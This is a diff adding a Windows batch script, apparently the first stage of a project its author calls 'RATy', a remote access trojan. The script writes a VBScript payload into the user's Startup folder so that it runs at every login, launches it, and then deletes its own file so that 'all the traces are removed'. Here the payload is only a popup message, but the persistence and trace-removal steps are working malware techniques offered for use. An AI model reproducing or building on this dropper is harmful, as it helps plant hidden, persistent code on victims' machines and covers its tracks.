@@ -1,0 +1,30 @@
+@ REM -@echo off-           if i uncomment it, then the commands below wont show up printed on the cmd after running the -initial.cmd- file in cmd.  Its better to keep commented in Testing/Debugging Mode and uncomment it in Prod Mode
+@REM Initial Stage for RATy
+@REM Created By : Muhammad Mohid Mughal
+
+@REM variables
+set "INITIALPATH=%cd%"    & @REM stores the initial path (in the variable) in which the user keeps the initially downloaded file, can be -Download- or -WP- or any other Folder
+set "STARTUP=C:/Users/%username%/Appdata/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+
+@REM Move into Start Up Directory
+cd "%STARTUP%"  & @REM  To change directory to the StartUp folder in order to create the desired file into that directory
+
+@REM Write Payloads to that Startup / Create the desired file in that Startup Folder , We are currently using -Vissual Basic Script (VBS)-
+(
+    echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2",262192, "Title"
+) > popup.vbs
+
+@REM Run the desired file / payload
+start popup.vbs
+
+@REM Move back to the initial Location from where we started -Download- or -WP- Folder, We Move back there as we want to remove the initial file in that directory so that all the traces are removed.
+cd "%INITIALPATH%"
+del initial.cmd
+
+
+
+
+
+
+
+
